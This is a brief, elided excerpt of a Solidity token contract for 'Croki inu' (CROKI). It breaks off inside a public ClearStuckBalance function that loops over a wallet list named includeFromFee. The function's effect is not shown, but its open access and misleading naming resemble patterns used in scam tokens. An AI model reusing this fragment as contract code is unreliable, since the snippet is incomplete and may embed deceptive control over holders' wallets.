...
contract Crokiinu is Context, IERC20, Ownable {
    ...
    string private constant _name = "Croki inu";
    string private constant _symbol = "CROKI";
    ...
    function ClearStuckBalance() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i];
